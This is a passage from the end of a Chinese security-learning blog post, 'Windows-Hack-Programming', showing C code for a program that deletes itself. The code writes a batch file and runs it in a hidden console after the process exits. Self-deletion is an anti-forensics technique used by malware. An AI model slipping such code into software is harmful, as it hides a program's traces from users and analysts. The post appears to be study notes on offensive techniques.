class="literal">NULL</span>;</span><br><span class="line">	fopen_s(&amp;fp, pszBatFileName, <span class="string">&quot;w+&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == fp)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	fwrite(szBat, (<span class="number">1</span> + ::lstrlen(szBat)), <span class="number">1</span>, fp);</span><br><span class="line">	fclose(fp);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">DelSelf</span><span class="params">(<span class="keyword">int</span> iType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	BOOL bRet = FALSE;</span><br><span class="line">	<span class="keyword">char</span> szCurrentDirectory[MAX_PATH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">char</span> szBatFileName[MAX_PATH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">char</span> szCmd[MAX_PATH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 获取当前程序所在目录</span></span><br><span class="line">	::GetModuleFileName(<span class="literal">NULL</span>, szCurrentDirectory, MAX_PATH);</span><br><span class="line">	<span class="keyword">char</span> *p = <span class="built_in">strrchr</span>(szCurrentDirectory, <span class="string">&#x27;\\&#x27;</span>);</span><br><span class="line">	p[<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">	<span class="comment">// 构造批处理文件路径</span></span><br><span class="line">	::wsprintf(szBatFileName, <span class="string">&quot;%s\\temp.bat&quot;</span>, szCurrentDirectory);</span><br><span class="line">	<span class="comment">// 构造调用执行批处理的 CMD 命令行</span></span><br><span class="line">	::wsprintf(szCmd, <span class="string">&quot;cmd /c call \&quot;%s\&quot;&quot;</span>, szBatFileName);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 创建自删除的批处理文件</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0</span> == iType)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// choice 方式</span></span><br><span class="line">		bRet = CreateChoiceBat(szBatFileName);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">1</span> == iType)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// ping 方式</span></span><br><span class="line">		bRet = CreatePingBat(szBatFileName);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 创建新的进程, 以隐藏控制台的方式执行批处理</span></span><br><span class="line">	<span class="keyword">if</span> (bRet)</span><br><span class="line">	&#123;</span><br><span class="line">		STARTUPINFO si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">		PROCESS_INFORMATION pi;</span><br><span class="line">		si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line">		<span class="comment">//指定wShowWindow成员有效</span></span><br><span class="line">		si.dwFlags = STARTF_USESHOWWINDOW;	</span><br><span class="line">		<span class="comment">//此成员设为TRUE的话则显示新建进程的主窗口</span></span><br><span class="line">		si.wShowWindow = FALSE;					</span><br><span class="line">		BOOL bRet = CreateProcess(</span><br><span class="line">			<span class="comment">//不在此指定可执行文件的文件名</span></span><br><span class="line">			<span class="literal">NULL</span>,	</span><br><span class="line">			<span class="comment">//命令行参数</span></span><br><span class="line">			szCmd,				</span><br><span class="line">			<span class="comment">//默认进程安全性</span></span><br><span class="line">			<span class="literal">NULL</span>,		</span><br><span class="line">			<span class="comment">//默认进程安全性</span></span><br><span class="line">			<span class="literal">NULL</span>,	</span><br><span class="line">			<span class="comment">//指定当前进程内句柄不可以被子进程继承</span></span><br><span class="line">			FALSE,					</span><br><span class="line">			<span class="comment">//为新进程创建一个新的控制台窗口</span></span><br><span class="line">			CREATE_NEW_CONSOLE,		</span><br><span class="line">			<span class="comment">//使用本进程的环境变量</span></span><br><span class="line">			<span class="literal">NULL</span>,				</span><br><span class="line">			<span class="comment">//使用本进程的驱动器和目录</span></span><br><span class="line">			<span class="literal">NULL</span>,								</span><br><span class="line">			&amp;si,</span><br><span class="line">			&amp;pi);</span><br><span class="line">		<span class="keyword">if</span> (bRet)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//不使用的句柄最好关掉</span></span><br><span class="line">			CloseHandle(pi.hThread);</span><br><span class="line">			CloseHandle(pi.hProcess);</span><br><span class="line"></span><br><span class="line">			<span class="comment">// 结束进程</span></span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">			::ExitProcess(<span class="literal">NULL</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 程序自删除</span></span><br><span class="line">	BOOL bRet = DelSelf( <span class="number">0</span> );</span><br><span class="line">	<span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Selft Delete Error!\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Selft Delete OK!\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">The_Itach1</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2022/01/31/Windows-Hack-Programming/">http://example.com/2022/01/31/Windows-Hack-Programming/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Windows/">Windows</a><a class="post-meta__tags" href="/tags/%E7%97%85%E6%AF%92/">病毒</a><a class="post-meta__tags" href="/tags/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/">编程开发</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2022/01/31/ktMQEOe8CgB9LJD.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/02/19/Log4j%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><img class="prev-cover" src="https://s2.loli.net/2022/02/19/mcDBoNOdi34ul2P.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">Log4j2 漏洞复现</div></div></a></div><div class="next-post pull-right"><a href="/2022/01/25/HWS%20DASCTF%20RE/"><img class="next-cover" src="https://s2.loli.net/2022/01/25/IfJOYwXAk65WyUN.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">HWS DASCTF RE</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2021/09/05/MEMZ分析/" title="MEMZ病毒分析"><img class="cover" src="https://i.loli.net/2021/09/05/zKCPGjyvV1FITn8.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-09-05</div><div class="title">MEMZ病毒分析</div></div></a></div><div><a href="/2021/10/19/Hook API/" title="Hook API"><img class="cover" src="https://i.loli.net/2021/10/19/zVLWyCboJvDKMQZ.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-19</div><div class="title">Hook API</div></div></a></div><div><a href="/2021/03/09/DLL注入技术/" title="DLL注入技术"><img class="cover" src="https://i.loli.net/2021/03/09/ureiVDLYMQqvnIf.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-03-09</div><div class="title">DLL注入技术</div></div></a></div><div><a href="/2022/01/11/windows反调试总结/" title="Windows反调试总结"><img class="cover" src="https://s2.loli.net/2022/01/11/RcyES7Ve6Fmk9Dw.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-11</div><div class="title">Windows反调试总结</div></div></a></div><div><a href="/2021/03/30/win32编程学习笔记/" title="win32编程学习笔记"><img class="cover" src="https://i.loli.net/2021/03/30/n7siDC4uFlg8SLv.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-03-30</div><div class="title">win32编程学习笔记</div></div></a></div><div><a href="/2021/09/29/恶意代码分析实战lab/" title="恶意代码分析实战lab"><img class="cover" src="https://i.loli.net/2021/09/29/h89W2gxaKytkvMU.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-09-29</div><div class="title">恶意代码分析实战lab</div></div></a></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/5.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">The_Itach1</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">54</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">23</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows-Hack-Programming"><span class="toc-number">1.</span> <span class="toc-text">Windows-Hack-Programming</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Evs%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%93%8D%E4%BD%9C"><span class="toc-number">1.1.</span> <span class="toc-text">关于vs的一些小操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E5%9F%BA%E7%A1%80%E6%8A%80%E6%9C%AF"><span class="toc-number">1.2.</span> <span class="toc-text">第二章-基础技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E5%8D%95%E4%B8%80%E5%AE%9E%E4%BE%8B"><span class="toc-number">1.2.1.</span> <span class="toc-text">运行单一实例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DLL%E5%BB%B6%E8%BF%9F%E5%8A%A0%E8%BD%BD"><span class="toc-number">1.2.2.</span> <span class="toc-text">DLL延迟加载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE"><span class="toc-number">1.2.3.</span> <span class="toc-text">资源释放</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF"><span class="toc-number">1.3.</span> <span class="toc-text">第三章-注入技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AA%81%E7%A0%B4SEESION-0-%E9%9A%94%E7%A6%BB%E7%9A%84%E8%BF%9C%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.1.</span> <span class="toc-text">突破SEESION 0 隔离的远线程注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#APC%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.2.</span> <span class="toc-text">APC注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF"><span class="toc-number">1.4.</span> <span class="toc-text">第四章-启动技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E8%BF%9B%E7%A8%8BAPI"><span class="toc-number">1.4.1.</span> <span class="toc-text">启动进程API</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E7%9B%B4%E6%8E%A5%E5%8A%A0%E8%BD%BD"><span class="toc-number">1.4.2.</span> <span class="toc-text">内存直接加载</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF"><span class="toc-number">1.5.</span> <span class="toc-text">第六章-提权技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">1.5.1.</span> <span class="toc-text">进程访问令牌权限提升</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%83%E7%AB%A0-%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF"><span class="toc-number">1.6.</span> <span class="toc-text">第七章-隐藏技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E4%BC%AA%E8%A3%85"><span class="toc-number">1.6.1.</span> <span class="toc-text">进程伪装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%82%80%E5%84%A1%E8%BF%9B%E7%A8%8B-%E8%87%AA%E6%88%91%E5%88%9B%E5%BB%BA"><span class="toc-number">1.6.2.</span> <span class="toc-text">傀儡进程-自我创建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%82%80%E5%84%A1%E8%BF%9B%E7%A8%8B-pe%E6%98%A0%E5%83%8F%E5%88%87%E6%8D%A2%E6%8A%80%E6%9C%AF"><span class="toc-number">1.6.3.</span> <span class="toc-text">傀儡进程-pe映像切换技术</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E7%AB%A0-%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF"><span class="toc-number">1.7.</span> <span class="toc-text">第十章-传输技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Socket-TCP"><span class="toc-number">1.7.1.</span> <span class="toc-text">Socket-TCP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Socket-UDP"><span class="toc-number">1.8.</span> <span class="toc-text">Socket-UDP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF"><span class="toc-number">1.9.</span> <span class="toc-text">功能技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E9%81%8D%E5%8E%86"><span class="toc-number">1.9.1.</span> <span class="toc-text">进程遍历</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86"><span class="toc-number">1.9.2.</span> <span class="toc-text">文件遍历</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%89%E9%94%AE%E8%AE%B0%E5%BD%95"><span class="toc-number">1.9.3.</span> <span class="toc-text">按键记录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A1%8C%E9%9D%A2%E6%88%AA%E5%B1%8F"><span class="toc-number">1.9.4.</span> <span class="toc-text">桌面截屏</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8Bcmd"><span class="toc-number">1.10.</span> <span class="toc-text">远程cmd</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%88%A0%E9%99%A4"><span class="toc-number">1.10.1.</span> <span class="toc-text">自删除</span></a></li></ol></li></ol></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/06/25/Crack_Typora/" title="Crack_Typora"><img src="https://s2.loli.net/2022/06/28/dTDv5MHfmJS72or.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Crack_Typora"/></a><div class="content"><a class="title" href="/2022/06/25/Crack_Typora/" title="Crack_Typora">Crack_Typora</a><time datetime="2022-06-25T09:38:45.000Z" title="Created 2022-06-25 17:38:45">2022-06-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/11/Recent%20CTF%20summary/" title="Recent CTF summary"><img src="https://s2.loli.net/2022/06/10/HR1Wcv8IJAznUOd.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Recent CTF summary"/></a><div class="content"><a class="title" href="/2022/06/11/Recent%20CTF%20summary/" title="Recent CTF summary">Recent CTF summary</a><time datetime="2022-06-11T09:38:45.000Z" title="Created 2022-06-11 17:38:45">2022-06-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/03/30/Simple%20Exe%20Packing/" title="Simple Exe Packing"><img src="https://s2.loli.net/2022/03/30/cVsNfuSDZGqMO4r.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Simple Exe Packing"/></a><div class="content"><a class="title" href="/2022/03/30/Simple%20Exe%20Packing/" title="Simple Exe Packing">Simple Exe Packing</a><time datetime="2022-03-30T10:38:45.000Z" title="Created 2022-03-30 18:38:45">2022-03-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/03/15/OWASP%20Top%2010%20learning/" title="OWASP Top 10 learning"><img src="https://s2.loli.net/2022/03/15/Afs4qw2QXxeUHlO.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="OWASP Top 10 learning"/></a><div class="content"><a class="title" href="/2022/03/15/OWASP%20Top%2010%20learning/" title="OWASP Top 10 learning">OWASP Top 10 learning</a><time datetime="2022-03-15T10:38:45.000Z" title="Created 2022-03-15 18:38:45">2022-03-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/02/25/%E5%90%91%E6%97%A5%E8%91%B5%20CNVD-2022-10270%E5%88%86%E6%9E%90/" title="向日葵 CNVD-2022-10270分析"><img src="https://s2.loli.net/2022/02/25/v2oYBbMdSCqf3gc.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="向日葵 CNVD-2022-10270分析"/></a><div class="content"><a class="title" href="/2022/02/25/%E5%90%91%E6%97%A5%E8%91%B5%20CNVD-2022-10270%E5%88%86%E6%9E%90/" title="向日葵 CNVD-2022-10270分析">向日葵 CNVD-2022-10270分析</a><time datetime="2022-02-25T10:38:45.000Z" title="Created 2022-02-25 18:38:45">2022-02-25</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://s2.loli.net/2022/01/31/ktMQEOe8CgB9LJD.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By The_Itach1</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">木叶飞舞之处，火亦生生不息</div><div class="icp"><a><span></span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>